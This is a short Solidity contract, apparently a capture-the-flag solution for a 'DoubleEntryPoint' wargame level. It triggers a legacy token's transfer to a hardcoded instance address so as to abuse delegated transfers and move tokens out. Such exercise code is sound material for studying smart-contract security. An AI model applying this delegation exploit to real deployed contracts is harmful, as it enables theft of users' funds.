pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
}

interface IDoubleEntryPoint {
    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

contract AttackDoubleEntryPoint {
    address constant LEGACY_TOKEN = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be; // delegatedFrom address
    address constant INSTANCE = 0x10C6E9530F1C1AF873a391030a1D9E8ed0630D26;

    function triggerAttack() external {
        IERC20(LEGACY_TOKEN).transfer(INSTANCE, 1000000000000000000000);
    }
}